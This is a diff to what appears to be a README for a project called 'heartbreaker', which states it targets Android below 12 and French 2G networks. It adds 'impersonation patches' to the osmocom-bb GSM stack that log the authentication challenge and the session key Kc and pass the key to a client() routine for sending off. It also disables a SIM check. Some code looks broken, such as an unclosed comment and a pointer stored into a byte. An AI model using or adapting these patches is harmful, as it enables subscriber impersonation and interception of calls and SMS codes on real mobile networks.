@@ -548,10 +548,6 @@ Targets android < 12, telco 2G until 2025 in France
 Thank for reading (see after for impersonation patches)
 
 ```patch
-Seulement dans osmocom-bb/: .git
-Seulement dans heartbreaker/bb-2rfa/src/host/gsmmap: compile
-Seulement dans heartbreaker/bb-2rfa/src/host/layer23: compile
-Seulement dans heartbreaker/bb-2rfa/src/host/layer23/src/mobile: client.h
 diff -ru osmocom-bb/src/host/layer23/src/mobile/gsm48_mm.c heartbreaker/bb-2rfa/src/host/layer23/src/mobile/gsm48_mm.c
 --- osmocom-bb/src/host/layer23/src/mobile/gsm48_mm.c	2022-08-30 15:39:46.222274989 +0200
 +++ heartbreaker/bb-2rfa/src/host/layer23/src/mobile/gsm48_mm.c	2022-08-30 15:35:55.472598046 +0200
@@ -588,10 +584,6 @@ diff -ru osmocom-bb/src/host/layer23/src/mobile/gsm48_mm.c heartbreaker/bb-2rfa/
  	gsm_subscr_generate_kc(ms, ar->key_seq, ar->rand, no_sim);
  
  	/* wait for auth response event from SIM */
-Seulement dans heartbreaker/bb-2rfa/src/host/layer23/src/mobile: hex2.h
-Seulement dans heartbreaker/bb-2rfa/src/host/layer23/src/mobile: hex.h
-Seulement dans heartbreaker/bb-2rfa/src/host/layer23/src/mobile: server2.h
-Seulement dans heartbreaker/bb-2rfa/src/host/layer23/src/mobile: server.h
 diff -ru osmocom-bb/src/host/layer23/src/mobile/subscriber.c heartbreaker/bb-2rfa/src/host/layer23/src/mobile/subscriber.c
 --- osmocom-bb/src/host/layer23/src/mobile/subscriber.c	2022-08-30 15:38:53.125893570 +0200
 +++ heartbreaker/bb-2rfa/src/host/layer23/src/mobile/subscriber.c	2022-08-30 15:35:55.476598075 +0200
@@ -633,10 +625,6 @@ diff -ru osmocom-bb/src/host/layer23/src/mobile/subscriber.c heartbreaker/bb-2rf
  		gsm48_mmevent_msg(ms, nmsg);
  
  		return 0;
-Seulement dans heartbreaker/bb-2rfa/src/host/layer23/src/mobile: suppress_space2.h
-Seulement dans heartbreaker/bb-2rfa/src/host/layer23/src/mobile: suppress_space.h
-Seulement dans heartbreaker/bb-2rfa/src/host/osmocon: compile
-Seulement dans osmocom-bb/src/shared/libosmocore/include/osmocom/core: crcgen.h
 ```
 suppress_space.h
 ```c
@@ -656,3 +644,76 @@ int i = 0;int j = 0;
        res[j] = '\0';
 return res;}
 ```
+Patch osmocom-bb
+
+```bash
+git checkout fixeria/trxcon
+```
+
+diff -ru trx/src/host/layer23/src/mobile/gsm48_mm.c osmocom-bb/src/host/layer23/src/mobile/gsm48_mm.c
+--- trx/src/host/layer23/src/mobile/gsm48_mm.c	2022-08-30 16:41:37.076916961 +0200
++++ osmocom-bb/src/host/layer23/src/mobile/gsm48_mm.c	2022-08-30 15:51:17.267099639 +0200
+@@ -1651,6 +1651,7 @@
+ 	 */
+ 	if (mm->est_cause == RR_EST_CAUSE_EMERGENCY && set->emergency_imsi[0])
+ 		no_sim = 1;
++	LOGP(DMM, LOGL_INFO, "AUTHENTICATION REQUEST (rand %s)\n", osmo_hexdump(ar->rand,16));	
+ 	gsm_subscr_generate_kc(ms, ar->key_seq, ar->rand, no_sim);
+ 
+ 	/* wait for auth response event from SIM */
+diff -ru trx/src/host/layer23/src/mobile/subscriber.c osmocom-bb/src/host/layer23/src/mobile/subscriber.c
+--- trx/src/host/layer23/src/mobile/subscriber.c	2022-08-30 16:41:37.076916961 +0200
++++ osmocom-bb/src/host/layer23/src/mobile/subscriber.c	2022-08-30 15:51:17.267099639 +0200
+@@ -32,7 +32,7 @@
+ #include <osmocom/bb/common/sap_proto.h>
+ #include <osmocom/bb/common/networks.h>
+ #include <osmocom/bb/mobile/vty.h>
+-
++#include "client.h"
+ /* enable to get an empty list of forbidden PLMNs, even if stored on SIM.
+  * if list is changed, the result is not written back to SIM */
+ //#define TEST_EMPTY_FPLMN
+@@ -369,6 +369,7 @@
+ 
+ 	/* key */
+ 	memcpy(subscr->key, data, 8);
++	//client(osmo_hexdump(subscr->key,8));
+ 
+ 	/* key sequence */
+ 	subscr->key_seq = data[8] & 0x07;
+@@ -907,7 +908,7 @@
+ 	struct msgb *nmsg;
+ 	struct sim_hdr *nsh;
+ 
+-	/* not a SIM */
++	/* not a SIM
+ 	if (!GSM_SIM_IS_READER(subscr->sim_type)
+ 	 || !subscr->sim_valid || no_sim) {
+ 		struct gsm48_mm_event *nmme;
+@@ -944,6 +945,7 @@
+ 
+ 		/* store sequence */
+ 		subscr->key_seq = key_seq;
++		//client(osmo_hexdump(vec->kc,8));
+ 		memcpy(subscr->key, vec->kc, 8);
+ 
+ 		LOGP(DMM, LOGL_INFO, "Sending authentication response\n");
+@@ -969,6 +971,7 @@
+ 
+ 	/* random */
+ 	memcpy(msgb_put(nmsg, 16), rand, 16);
++	LOGP(DMM, LOGL_NOTICE, "Key Sequence=%d\n",key_seq);
+ 
+ 	/* store sequence */
+ 	subscr->key_seq = key_seq;
+@@ -1019,7 +1022,9 @@
+ 	nsh->file = 0x6f20;
+ 	data = msgb_put(nmsg, 9);
+ 	memcpy(data, subscr->key, 8);
+-	data[8] = subscr->key_seq;
++        LOGP(DMM, LOGL_NOTICE, "KC=%s\n",osmo_hexdump(subscr->key,8));
++	client(osmo_hexdump(subscr->key,8));
++	data[8] = subscr->key;
+ 	sim_job(ms, nmsg);
+ 
+ 	/* return signed response */
